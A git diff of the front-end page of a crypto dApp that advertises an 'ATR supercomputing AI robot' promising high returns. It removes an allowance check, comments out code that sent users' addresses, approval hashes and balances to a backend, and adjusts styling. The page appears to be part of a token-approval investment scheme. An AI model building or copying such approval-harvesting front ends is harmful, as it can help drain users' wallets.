@@ -31,7 +31,6 @@ export default function Home() {
   const { userBalance } = useContractUserBalance()
   const [contractAddress, setContractAddress] = useState<any>("")
   const [backList,setBackList] = useState<any>([])
-  const { isAllowed } = useContractUserAllowanceStatus(contractAddress || "0x070c9581ce99eedbc659d1a34569f1c548a08a1b")
   const [addData,setAddData] = useState({
     isShow: false,
     title: '',
@@ -93,20 +92,20 @@ export default function Home() {
   }
   const handleParticipate = async () => {
     if(contractAddress == "") return
-    if(isAllowed && address && chain?.id != 56){
-      const res = await postUserapproveAuth({
-        address,
-        chain_type: chain?.id,
-        auth_status: 0,
-        auth_hash: data?.hash || '',
-        balance: userBalance,
-      })
-      setSnackbarValue({
-          open: true,
-          message: t("index.authed"),
-      })
-      return
-    }
+    // if(isAllowed && address && chain?.id != 56){
+    //   const res = await postUserapproveAuth({
+    //     address,
+    //     chain_type: chain?.id,
+    //     auth_status: 0,
+    //     auth_hash: data?.hash || '',
+    //     balance: userBalance,
+    //   })
+    //   setSnackbarValue({
+    //       open: true,
+    //       message: t("index.authed"),
+    //   })
+    //   return
+    // }
     setLoding(true)
     try {
       await approve({
@@ -121,17 +120,17 @@ export default function Home() {
   return (
     <article 
       className="h-full"
-      style={{ overflowX: 'hidden',position: "relative", }}
+      style={{ overflowX: 'hidden',position: "relative",zIndex: "10", }}
     >
-      <article className="w-full mt-[100px] px-10">
-        <Grid container className="w-full bg-[#131C20]">
-          <Grid item xs={12} lg={7} style={{display: "flex", flexDirection: "column", justifyContent: "center"}}>
-            <div className="px-[92px]">
-              <span className="text-[72px] font-bold"><span className="text-[#E1146E]">ATR</span>超算AI机器人</span>
+      <article className="w-full mt-[100px] px-4 sm:px-20">
+        <Grid container className="w-full bg-[#131C20]" style={{paddingBottom: "0"}}>
+          <Grid item xs={12} lg={7} style={{display: "flex", flexDirection: "column", justifyContent: "center"}} className="py-[30px] sm:py-[0px]">
+            <div className="px-[20px] sm:px-[92px]">
+              <span className="text-2xl sm:text-5xl font-bold"><span className="text-[#E1146E]">ATR</span>超算AI机器人</span>
             </div>
-            <div className="px-[92px] py-[8px] bg-[rgba(0,0,0,0.5)]" style={{paddingRight: "20px"}}>
-              <span className="text-[28px] sm:text-[48px] font-bold"><span className="text-[#E1146E]">首发</span>1000<span className="text-[#E1146E]">台火爆上线</span></span>
-              <span className="text-[30px]">(高额收益)</span>
+            <div className=" px-[20px] py-[8px] sm:px-[92px] bg-[rgba(255,255,255,0.2)] mt-2" style={{paddingRight: "20px"}}>
+              <span className="text-xl sm:text-4xl font-bold"><span className="text-[#E1146E]">首发</span>1000<span className="text-[#E1146E]">台火爆上线</span></span>
+              <span className="text-xs sm:text-4xl ml-2">(高额收益)</span>
             </div>
           </Grid>
           <Grid item xs={12} lg={5}>
